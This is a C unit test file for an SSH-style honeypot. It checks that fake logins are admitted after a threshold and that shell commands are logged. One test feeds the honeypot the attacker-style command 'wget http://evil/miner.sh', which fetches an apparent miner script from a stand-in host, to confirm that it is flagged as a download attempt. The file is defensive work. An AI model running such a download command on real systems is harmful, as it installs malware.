#include <fcntl.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "honeypot/auth.h"
#include "honeypot/fakeshell.h"
#include "honeypot/session.h"
#include "unity.h"


#define CAP_MAX 32
static struct event cap[CAP_MAX];
static int cap_n;

static void capture_sink(const struct event *ev, void *ctx)
{
    (void)ctx;
    if (cap_n < CAP_MAX)
        cap[cap_n++] = *ev;
}

static struct hp_session make_session(int conn)
{
    struct hp_session s = { 0 };
    s.conn = conn;
    s.port = 2222;
    s.sid = 7;
    s.login_after = 3;
    s.sink = capture_sink;
    s.ctx = NULL;
    event_set_str(s.ip, sizeof s.ip, "192.168.0.42");
    return s;
}

void setUp(void) { cap_n = 0; }
void tearDown(void) {}


static void test_auth_denies_before_threshold(void)
{
    struct hp_session s = make_session(-1);
    struct auth_state st = { 0 };

    TEST_ASSERT_EQUAL_INT(0, auth_try(&st, &s, "root", "1111"));
    TEST_ASSERT_EQUAL_INT(0, auth_try(&st, &s, "root", "2222"));
    TEST_ASSERT_EQUAL_INT(2, cap_n);
    TEST_ASSERT_EQUAL_INT(EV_LOGIN_ATTEMPT, cap[0].type);
    TEST_ASSERT_EQUAL_STRING("root", cap[0].username);
    TEST_ASSERT_EQUAL_STRING("1111", cap[0].password);
    TEST_ASSERT_EQUAL_UINT(7, cap[0].session_id);
    TEST_ASSERT_EQUAL_STRING("192.168.0.42", cap[0].src_ip);
}


static void test_auth_lets_in_on_threshold(void)
{
    struct hp_session s = make_session(-1);
    struct auth_state st = { 0 };

    auth_try(&st, &s, "root", "a");
    auth_try(&st, &s, "root", "b");
    TEST_ASSERT_EQUAL_INT(1, auth_try(&st, &s, "admin", "letmein"));
    TEST_ASSERT_EQUAL_INT(1, st.authenticated);


    TEST_ASSERT_EQUAL_INT(4, cap_n);
    TEST_ASSERT_EQUAL_INT(EV_LOGIN_ATTEMPT, cap[2].type);
    TEST_ASSERT_EQUAL_INT(EV_LOGIN_SUCCESS, cap[3].type);
    TEST_ASSERT_EQUAL_STRING("admin", cap[3].username);
}


static void test_shell_logs_command(void)
{
    int sv[2];
    TEST_ASSERT_EQUAL_INT(0, socketpair(AF_UNIX, SOCK_STREAM, 0, sv));
    struct hp_session s = make_session(sv[0]);

    shell_exec(&s, "whoami");

    TEST_ASSERT_EQUAL_INT(1, cap_n);
    TEST_ASSERT_EQUAL_INT(EV_COMMAND, cap[0].type);
    TEST_ASSERT_EQUAL_STRING("whoami", cap[0].details);

    close(sv[0]);
    close(sv[1]);
}

static void test_shell_flags_download(void)
{
    int sv[2];
    TEST_ASSERT_EQUAL_INT(0, socketpair(AF_UNIX, SOCK_STREAM, 0, sv));
    struct hp_session s = make_session(sv[0]);

    shell_exec(&s, "wget http://evil/miner.sh");

    TEST_ASSERT_EQUAL_INT(2, cap_n);
    TEST_ASSERT_EQUAL_INT(EV_COMMAND, cap[0].type);
    TEST_ASSERT_EQUAL_INT(EV_DOWNLOAD_ATTEMPT, cap[1].type);
    TEST_ASSERT_EQUAL_STRING("wget http://evil/miner.sh", cap[1].details);

    close(sv[0]);
    close(sv[1]);
}


static void test_shell_ignores_empty(void)
{
    int sv[2];
    TEST_ASSERT_EQUAL_INT(0, socketpair(AF_UNIX, SOCK_STREAM, 0, sv));
    struct hp_session s = make_session(sv[0]);

    shell_exec(&s, "");

    TEST_ASSERT_EQUAL_INT(0, cap_n);

    close(sv[0]);
    close(sv[1]);
}

int main(void)
{
    UNITY_BEGIN();
    RUN_TEST(test_auth_denies_before_threshold);
    RUN_TEST(test_auth_lets_in_on_threshold);
    RUN_TEST(test_shell_logs_command);
    RUN_TEST(test_shell_flags_download);
    RUN_TEST(test_shell_ignores_empty);
    return UNITY_END();
}